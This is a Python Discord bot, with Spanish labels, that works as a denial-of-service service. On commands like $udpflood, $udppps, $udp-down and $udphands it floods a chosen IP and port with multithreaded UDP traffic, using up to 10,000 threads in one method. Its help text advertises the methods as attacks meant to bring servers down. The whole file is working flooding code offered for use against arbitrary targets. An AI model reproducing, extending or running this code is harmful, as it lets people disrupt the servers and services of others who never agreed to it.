import discord
from discord.ext import commands
import socket
import time
import random
import string
import asyncio
import threading
from random import randint
import os

TOKEN_FILE = "token.txt"
if os.path.isfile(TOKEN_FILE):
    with open(TOKEN_FILE, "r") as f:
        TOKEN = f.read().strip()
else:
    import getpass
    TOKEN = getpass.getpass("Introduce el token del bot: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(TOKEN.strip())

intents = discord.Intents.all()
intents.message_content = True

bot = commands.Bot(command_prefix='$', intents=intents)

attack_in_progress = False
last_attack_time = 0
cooldown_seconds = 10
current_attack_stop_event = None
owner_id = "1102257907522863175"
authorized_users = {owner_id}

@bot.event
async def on_ready():
    print(f'[+] Bot conectado como {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="👊🏼 $ayuda"))

# ========= COMANDOS BÁSICOS =========
@bot.command(name='ayuda')
async def ayuda(ctx):
    embed = discord.Embed(
        title="🥋 **MENÚ DE AYUDA**",
        description="Comandos básicos del bot",
        color=0x00ff00
    )
    embed.add_field(
        name="💻 **COMANDOS**",
        value=(
            "`$ayuda` - Muestra este mensaje\n"
            "`$methods` - Ver todos los métodos de ataque\n"
            "`$botstatus` - Estado del servidor\n"
            "`$adduser <id>` - Autorizar usuario (Solo owner)"
        ),
        inline=False
    )
    embed.set_footer(text="🔹 Usa $methods para ver los ataques disponibles")
    await ctx.send(embed=embed)

@bot.command(name='methods')
async def methods(ctx):
    embed = discord.Embed(
        title="💣 **MÉTODOS DISPONIBLES**",
        description="Todos los tipos de ataque implementados",
        color=0xff0000
    )
    embed.add_field(
        name="📌 **UDP-PPS**",
        value="```$udppps <ip> <puerto> <hilos> <tiempo>```\n"
              "Ataque UDP Small Packets",
        inline=False
    )
    embed.add_field(
        name="🌊 **UDP-FLOOD**",
        value="```$udpflood <ip> <puerto> <tiempo>```\n"
              "Flood UDP Clasico",
        inline=False
    )
    embed.add_field(
        name="💥 **UDP-DOWN**",
        value="```$udp-down <ip> <puerto> <tiempo>```\n"
              "UDP con Para Destruir Servidores",
        inline=False
    )
    embed.add_field(
        name="🤝 **UDP-HANDSHAKE**",
        value="```$udphands <ip> <puerto> <hilos> <tiempo>```\n"
              "Handshake UDP",
        inline=False
    )
    embed.add_field(
        name="⛔ **DETENER**",
        value="```$stop``` - Detiene todos los ataques activos",
        inline=False
    )
    embed.set_footer(text="⚡ Ejemplo: $udpflood 1.1.1.1 80 60")
    await ctx.send(embed=embed)

@bot.command(name='botstatus')
async def botstatus(ctx):
    try:
        cpu_load = os.getloadavg()[0] if hasattr(os, "getloadavg") else 0
        if os.path.exists('/proc/meminfo'):
            with open('/proc/meminfo') as f:
                lines = f.readlines()
            mem_total = int([x for x in lines if "MemTotal" in x][0].split()[1]) / 1024
            mem_free = int([x for x in lines if "MemAvailable" in x][0].split()[1]) / 1024
        else:
            mem_total = mem_free = 0
        
        cpu_cores = os.cpu_count() or 1
        cpu_percent = min(cpu_load / cpu_cores, 1.0)
        mem_percent = 1 - (mem_free / mem_total) if mem_total else 0

        status = "✅ **RAPIDO**"
        if cpu_percent > 0.7 or mem_percent > 0.7:
            status = "⚠️ **MEDIO**"
        if cpu_percent > 0.9 or mem_percent > 0.9:
            status = "❌ **LENTO**"

        embed = discord.Embed(
            title="📊 **ESTADO DEL SERVIDOR**",
            color=0x3498db
        )
        embed.add_field(name="🖥️ **STATUS**", value=status, inline=False)
        embed.add_field(
            name="⚙️ **CPU**", 
            value=f"```Carga: {cpu_load:.2f}\nUso: {cpu_percent*100:.0f}%```", 
            inline=True
        )
        embed.add_field(
            name="💾 **RAM**", 
            value=f"```Libre: {mem_free:.0f}MB\nTotal: {mem_total:.0f}MB\nUso: {mem_percent*100:.0f}%```", 
            inline=True
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error al verificar el estado: {str(e)}")

@bot.command(name='adduser')
async def adduser(ctx, user_id: str):
    if str(ctx.author.id) != owner_id:
        embed = discord.Embed(
            description="❌ **Solo el owner puede usar este comando**",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return
    
    authorized_users.add(user_id)
    embed = discord.Embed(
        description=f"✅ **Usuario {user_id} autorizado correctamente**",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

# ========= CLASES DE ATAQUE ========= 
class Brutalize:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.packet_size = 1024
        self.threads = threads
        self.client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.packet_size)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0
        self.stop_event = stop_event

    def flood(self, duration):
        self.on = True
        self.sent = 0
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)
        info_thread = threading.Thread(target=self.info, daemon=True)
        info_thread.start()
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def info(self):
        interval = 0.05
        mb = 1000000
        gb = 1000000000
        size = 0
        self.total = 0
        last_time = time.time()
        while self.on:
            time.sleep(interval)
            if not self.on:
                break
            now = time.time()
            if now - last_time >= 1:
                size = round(self.sent / mb)
                self.total += self.sent / gb
                self.sent = 0
                last_time = now

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

class UDPHandShake:
    def __init__(self, ip, port, threads, stop_event=None):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.on = False
        self.stop_event = stop_event

    def flood(self, duration):
        self.on = True
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send, daemon=True)
            t.start()
            threads.append(t)
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                if self.stop_event and self.stop_event.is_set():
                    break
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            if self.stop_event and self.stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = str.encode("X" * randint(700, 1400))
                s.sendto(data, (self.ip, self.port))
                s.close()
            except Exception:
                pass

# ========= COMANDOS DE ATAQUE =========
async def send_attack_embed(ctx, attack_name, ip, port, tiempo, threads=None):
    embed = discord.Embed(
        title=f"🚀 **{attack_name.upper()} INICIADO**",
        color=0xffa500
    )
    embed.add_field(name="🎯 **IP**", value=f"```{ip}```", inline=True)
    embed.add_field(name="☢️ **PUERTO**", value=f"```{port}```", inline=True)
    embed.add_field(name="⏱️ **TIEMPO**", value=f"```{tiempo}s```", inline=True)
    if threads:
        embed.add_field(name="🧵 **HILOS**", value=f"```{threads}```", inline=True)
    embed.set_footer(text="⚡ Ataque en progreso...")
    await ctx.send(embed=embed)

@bot.command(name='udppps')
async def udppps(ctx, ip: str, port: int, threads: int, tiempo: int):
    if str(ctx.author.id) not in authorized_users:
        await ctx.send("❌ **No tienes permiso para usar este comando**")
        return
        
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("⚠️ **Ya hay un ataque en curso**")
        return
        
    if time.time() - last_attack_time < cooldown_seconds:
        remaining = int(cooldown_seconds - (time.time() - last_attack_time))
        await ctx.send(f"⏳ **Debes esperar {remaining} segundos**")
        return
        
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    
    await send_attack_embed(ctx, "UDP-PPS", ip, port, tiempo, threads)

    try:
        brute = Brutalize(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, brute.flood, tiempo)
        
        embed = discord.Embed(
            description=f"✅ **UDP-PPS finalizado contra {ip}:{port}**",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ **Error en UDP-PPS:** {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@bot.command(name='udphands')
async def udphands(ctx, ip: str, port: int, threads: int, tiempo: int):
    if str(ctx.author.id) not in authorized_users:
        await ctx.send("❌ **No tienes permiso para usar este comando**")
        return
        
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("⚠️ **Ya hay un ataque en curso**")
        return
        
    if time.time() - last_attack_time < cooldown_seconds:
        remaining = int(cooldown_seconds - (time.time() - last_attack_time))
        await ctx.send(f"⏳ **Debes esperar {remaining} segundos**")
        return
        
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    
    await send_attack_embed(ctx, "UDP-HANDSHAKE", ip, port, tiempo, threads)

    try:
        handshaker = UDPHandShake(ip, port, threads, stop_event=current_attack_stop_event)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, handshaker.flood, tiempo)
        
        embed = discord.Embed(
            description=f"✅ **UDP-HANDSHAKE finalizado contra {ip}:{port}**",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ **Error en UDP-HANDSHAKE:** {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

def send_packet_flood(ip, port, amplifier, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(ip), int(port)))
        while not stop_event.is_set():
            s.send(b"\x99" * amplifier)
    except Exception:
        try:
            s.close()
        except:
            pass

def udp_flood_attack(ip, port, duration, amplifier, stop_event):
    loops = 10000
    threads = []
    for _ in range(loops):
        t = threading.Thread(target=send_packet_flood, args=(ip, port, amplifier, stop_event), daemon=True)
        t.start()
        threads.append(t)
    end_time = time.time() + duration
    while time.time() < end_time:
        if stop_event.is_set():
            break
        time.sleep(0.1)
    stop_event.set()

@bot.command(name='udpflood')
async def udpflood(ctx, ip: str, port: int, tiempo: int):
    if str(ctx.author.id) not in authorized_users:
        await ctx.send("❌ **No tienes permiso para usar este comando**")
        return
        
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("⚠️ **Ya hay un ataque en curso**")
        return
        
    if time.time() - last_attack_time < cooldown_seconds:
        remaining = int(cooldown_seconds - (time.time() - last_attack_time))
        await ctx.send(f"⏳ **Debes esperar {remaining} segundos**")
        return
        
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    
    await send_attack_embed(ctx, "UDP-FLOOD", ip, port, tiempo)

    try:
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750, current_attack_stop_event)
        
        embed = discord.Embed(
            description=f"✅ **UDP-FLOOD finalizado contra {ip}:{port}**",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ **Error en UDP-FLOOD:** {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None

@bot.command(name='udp-down')
async def udp_down(ctx, ip: str, port: int, tiempo: int):
    if str(ctx.author.id) not in authorized_users:
        await ctx.send("❌ **No tienes permiso para usar este comando**")
        return
        
    global attack_in_progress, last_attack_time, current_attack_stop_event
    if attack_in_progress:
        await ctx.send("⚠️ **Ya hay un ataque en curso**")
        return
        
    if time.time() - last_attack_time < cooldown_seconds:
        remaining = int(cooldown_seconds - (time.time() - last_attack_time))
        await ctx.send(f"⏳ **Debes esperar {remaining} segundos**")
        return
        
    attack_in_progress = True
    current_attack_stop_event = threading.Event()
    
    await send_attack_embed(ctx, "UDP-DOWN", ip, port, tiempo)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + tiempo
        sent_packets = 0
        packet_sizes = [1024, 512, 1450, 128, 256]  # Tamaños comunes para paquetes UDP
        
        while time.time() < end_time:
            if current_attack_stop_event.is_set():
                break
                
            # Método optimizado basado en el script de Leeon123
            udpbytes = random._urandom(random.choice(packet_sizes))
            try:
                s.sendto(udpbytes, (ip, port))
                sent_packets += 1
                
                # Envío en ráfagas para mayor eficiencia (como en el script original)
                if sent_packets % 100 == 0:  # Pequeña pausa cada 100 paquetes
                    await      asyncio.sleep(0.001)
            except:
                continue  # Manejo silencioso de errores como en el original
            
        embed = discord.Embed(
            description=f"✅ **UDP-DOWN finalizado: {sent_packets:,} paquetes enviados**",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ **Error en UDP-DOWN:** {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    finally:
        attack_in_progress = False
        last_attack_time = time.time()
        current_attack_stop_event = None
        try:
            s.close()
        except:
            pass

@bot.command(name='stop')
async def stop(ctx):
    if str(ctx.author.id) not in authorized_users:
        await ctx.send("❌ **No tienes permiso para usar este comando**")
        return
        
    global attack_in_progress, current_attack_stop_event
    
    if attack_in_progress and current_attack_stop_event:
        current_attack_stop_event.set()
        embed = discord.Embed(
            description="🔴 **Todos los ataques han sido detenidos**",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            description="ℹ️ **No hay ataques activos para detener**",
            color=0xffff00
        )
        await ctx.send(embed=embed)

# ========= MANEJO DE ERRORES =========
@udppps.error
@udpflood.error
@udphands.error
@udp_down.error
async def attack_errors(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            description="❌ **Faltan argumentos. Usa $methods para ver la sintaxis**",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            description=f"⚠️ **Error:** {str(error)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

@adduser.error
async def adduser_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            description="❌ **Debes especificar un ID de usuario**",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            description=f"⚠️ **Error:** {str(error)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)

bot.run(TOKEN)